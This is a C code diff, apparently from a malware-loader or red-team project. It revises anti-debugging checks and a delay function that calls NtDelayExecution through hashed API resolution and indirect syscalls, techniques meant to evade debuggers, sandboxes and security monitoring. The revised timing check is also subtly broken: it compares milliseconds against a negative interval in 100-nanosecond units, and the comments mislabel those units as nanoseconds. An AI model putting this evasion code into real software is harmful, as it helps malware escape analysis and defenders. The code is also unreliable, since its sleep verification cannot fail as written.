@@ -1,6 +1,7 @@
 #include "anti-debug.h"
-#include "indirect_syscall.h"
 #include "debug.h"
+#include "custom_loaderapi.h"
+#include "indirect_syscall.h"
 
 // https://github.com/LordNoteworthy/al-khaser
 #define DEBUG
@@ -14,7 +15,6 @@ BOOL AntiDebugPEBCheck() {
 #endif
 
 	BOOLEAN debugged = pPeb->BeingDebugged;
-	//printf("[!] Is Debugged -> %d\n", debugged);
 	return (debugged == 1) ? TRUE : FALSE;
 }
 
@@ -44,7 +44,8 @@ Return Value:
 	FALSE - otherwise
 --*/
 {
-	PDWORD pNtGlobalFlag = NULL, pNtGlobalFlagWoW64 = NULL;
+	PDWORD pNtGlobalFlag = NULL, 
+		   pNtGlobalFlagWoW64 = NULL;
 
 #if defined (ENV64BIT)
 	pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
@@ -76,43 +77,52 @@ Return Value:
 }
 
 
+// (-N) indicates to current relative time
+// example		   -150000000 -> 15 secs
+// llNanoseconds = -10000000 -> 1 sec
+BOOL DelayExecution(LONGLONG llNanoseconds) {
 
-BOOL DelayExecution(FLOAT ftMinutes) {
+	t_GetTickCount64 GetTickCount64 = (t_GetTickCount64)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), GETTICKCOUNT64_HASH);
 
 	NTAPI_FUNC _G_NTFUNC = { 0 };
 
-	// Converting minutes to milliseconds  
-	DWORD               dwMilliSeconds = ftMinutes * 60000;
 	LARGE_INTEGER       DelayInterval = { 0 };
-	LONGLONG            Delay = NULL;
+	LONGLONG            Delay = llNanoseconds;
 	NTSTATUS            STATUS = NULL;
-	DWORD               _T0 = NULL,
+	LONGLONG			_T0 = NULL,
 						_T1 = NULL;
 
-	// Converting from milliseconds to the 100-nanosecond - negative time interval
-	Delay = dwMilliSeconds * 10000;
-	DelayInterval.QuadPart = -Delay;
+	DelayInterval.QuadPart = Delay;
 
 	_T0 = GetTickCount64();
 
-	// Sleeping for 'dwMilliSeconds' ms 
-	ObtainSyscall(NTDELAYEXECUTION_HASH, &_G_NTFUNC.NtDelayExecution);
+	// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtDelayExecution.html 
+	if (!ObtainSyscall(NTDELAYEXECUTION_HASH, &_G_NTFUNC.NtDelayExecution)) {
+		return -1;
+	}
 	SET_SYSCALL(_G_NTFUNC.NtDelayExecution);
+
 #ifdef DEBUG
 	PRINTA("[+] Starting execution delay!\n");
 #endif
+
 	if ((STATUS = RunSyscall(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
+
 #ifdef DEBUG
 			PRINTA("[!] NtDelayExecution Failed With Error: 0x%0.8X \n", STATUS);
 #endif
+
 			return -1;
 	}
+#ifdef DEBUG
+	PRINTW(L"[*] NtDelayExecution slept for ->  %d\n", DelayInterval.QuadPart);
+#endif
 
 	_T1 = GetTickCount64();
 
-	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecution' succeeded, otherwise it failed
-	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
+	if ((_T1 - _T0) < DelayInterval.QuadPart) {
 		return FALSE;
+	}
 
 	return TRUE;
 }
